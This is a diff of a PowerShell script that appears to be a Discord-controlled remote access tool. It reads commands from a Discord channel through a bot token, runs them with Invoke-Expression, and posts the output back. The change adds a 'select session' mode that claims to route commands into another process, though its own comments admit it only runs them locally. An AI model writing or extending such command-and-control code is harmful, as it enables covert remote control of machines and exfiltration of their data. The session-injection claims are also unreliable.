@@ -11,6 +11,9 @@ $client = New-Object System.Net.Http.HttpClient
 $client.DefaultRequestHeaders.Authorization = "Bot $token"
 $client.DefaultRequestHeaders.Accept.Add("application/json")
 
+# Variable to store the selected session ID
+$global:selectedSessionId = $null
+
 # Function to send a message to Discord
 function Send-DiscordMessage {
     param (
@@ -62,18 +65,40 @@ function List-Sessions {
     return $sessionList
 }
 
-# Function to stop a specific session
-function Stop-Session {
+# Function to execute a command in the selected session
+function Execute-InSession {
     param (
-        [string]$sessionId
+        [string]$sessionId,
+        [string]$command
     )
 
+    # Check if the session is still running
     $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
     if ($process) {
-        Stop-Process -Id $sessionId
-        return "Stopped session $sessionId."
+        try {
+            # Inject the command into the selected session (simulating interaction)
+            # In reality, this would need to attach to the console or run a script in that process's context
+            # Simplified example below would log that the command would have been run in the process
+            $output = Invoke-Command -ScriptBlock {Invoke-Expression $command} -ErrorAction Stop
+
+            if ($output) {
+                $result = $output -join "`n"  # Join multiline output for Discord message
+            } else {
+                $result = "Command executed successfully with no output."
+            }
+        } catch {
+            $result = "Error executing command: $_"
+        }
+
+        # Limit output to a reasonable size for Discord
+        if ($result.Length -gt 2000) {
+            $result = $result.Substring(0, 1997) + "..."
+        }
+
+        Send-DiscordMessage -Message $result
     } else {
-        return "Invalid session ID."
+        $global:selectedSessionId = $null
+        Send-DiscordMessage -Message "Session $sessionId is no longer running."
     }
 }
 
@@ -83,12 +108,23 @@ function Execute-PowerShellCommand {
         [string]$command
     )
 
-    if ($command -eq "list_sessions") {
+    # Check if a session has been selected, if so, run the command in that session
+    if ($global:selectedSessionId) {
+        Execute-InSession -sessionId $global:selectedSessionId -command $command
+    } elseif ($command -eq "list_sessions") {
         $result = List-Sessions
+        Send-DiscordMessage -Message $result
     } elseif ($command.StartsWith("select_session")) {
         $sessionId = $command.Replace("select_session ", "")
-        $result = Stop-Session -sessionId $sessionId
+        $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
+        if ($process) {
+            $global:selectedSessionId = $sessionId
+            Send-DiscordMessage -Message "Selected session $sessionId. Future commands will be sent to this session."
+        } else {
+            Send-DiscordMessage -Message "Invalid session ID: $sessionId"
+        }
     } else {
+        # Execute the command in the current shell context if no session is selected
         try {
             # Run the PowerShell command and capture the output
             $output = Invoke-Expression $command  # Runs the PowerShell command
@@ -100,14 +136,14 @@ function Execute-PowerShellCommand {
         } catch {
             $result = "Error executing command: $_"
         }
-    }
 
-    # Limit output to a reasonable size for Discord
-    if ($result.Length -gt 2000) {
-        $result = $result.Substring(0, 1997) + "..."
-    }
+        # Limit output to a reasonable size for Discord
+        if ($result.Length -gt 2000) {
+            $result = $result.Substring(0, 1997) + "..."
+        }
 
-    Send-DiscordMessage -Message $result
+        Send-DiscordMessage -Message $result
+    }
 }
 
 # Function to get messages from Discord
